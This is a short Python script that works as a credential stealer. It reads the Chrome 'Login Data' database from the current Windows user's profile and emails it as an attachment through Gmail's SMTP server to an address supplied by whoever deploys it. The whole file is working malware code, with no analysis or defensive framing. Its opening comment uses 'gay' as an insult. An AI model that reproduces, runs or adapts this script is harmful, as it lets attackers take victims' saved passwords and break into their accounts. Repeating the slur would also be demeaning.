#Don't Be A Gay Copying This Does Not Make You A Programmer 
import smtplib
import getpass
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

user = getpass.getuser()

smtp = smtplib.SMTP("smtp.gmail.com",587)

with open("C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data".format(user),"rb") as s:
    part = MIMEBase("application", "octet-stream")
    part.set_payload(s.read())

message = MIMEMultipart()

encoders.encode_base64(part)

part.add_header(
    "Content-Disposition",
    f"attachment; filename=LoginChrome",
)

message.attach(part)
text = message.as_string()

smtp.starttls()
smtp.login("<your email here>","<password here>")
smtp.sendmail(from_addr="<your email here>",to_addrs="<your email here>",msg=text)
smtp.close()
